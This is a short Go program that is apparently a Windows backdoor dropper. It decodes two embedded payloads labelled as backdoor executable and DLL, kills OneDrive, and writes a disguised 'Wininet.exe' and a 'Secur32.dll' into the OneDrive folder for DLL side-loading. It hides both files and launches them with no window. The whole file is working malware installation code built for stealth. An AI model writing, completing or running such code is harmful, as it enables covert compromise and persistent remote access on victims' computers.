package main

import (
    "os"
    "time"
    "unsafe"
    "syscall"
    "path/filepath"
    "encoding/base64"
)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
)

const (
    CREATE_NO_WINDOW = 0x08000000
)

func executeHidden(path string) {
    var si syscall.StartupInfo
    var pi syscall.ProcessInformation
    si.Cb = uint32(unsafe.Sizeof(si))
    si.Flags = syscall.STARTF_USESHOWWINDOW
    si.ShowWindow = syscall.SW_HIDE

    pathPtr, _ := syscall.UTF16PtrFromString(path)
    kernel32.NewProc("CreateProcessW").Call(
        0,
        uintptr(unsafe.Pointer(pathPtr)),
        0,
        0,
        0,
        CREATE_NO_WINDOW,
        0,
        0,
        uintptr(unsafe.Pointer(&si)),
        uintptr(unsafe.Pointer(&pi)),
    )
}

func setHidden(path string) {
    pathPtr, _ := syscall.UTF16PtrFromString(path)
    kernel32.NewProc("SetFileAttributesW").Call(
        uintptr(unsafe.Pointer(pathPtr)),
        syscall.FILE_ATTRIBUTE_HIDDEN,
    )
}

func killProcess(name string) {
    cmd := "taskkill /im " + name + " /f"
    cmdPtr, _ := syscall.UTF16PtrFromString(cmd)
    kernel32.NewProc("WinExec").Call(
        uintptr(unsafe.Pointer(cmdPtr)),
        uintptr(0),
    )
}

func main() {
    exeData, _ := base64.StdEncoding.DecodeString("africana_backdoor_e")
    dllData, _ := base64.StdEncoding.DecodeString("africana_backdoor_d")

    exePath := filepath.Join(os.Getenv("TEMP"), "Wininet.exe")
    dllPath := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "OneDrive", "Secur32.dll")

    killProcess("OneDrive.exe")
    killProcess("Wininet.exe")
    time.Sleep(1 * time.Second)
    os.Remove(exePath)
    os.Remove(dllPath)
    time.Sleep(1 * time.Second)

    os.WriteFile(exePath, exeData, 0644)
    os.WriteFile(dllPath, dllData, 0644)

    setHidden(exePath)
    setHidden(dllPath)

    oneDrivePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "OneDrive", "OneDrive.exe")
    executeHidden(oneDrivePath)

    executeHidden(exePath)
}
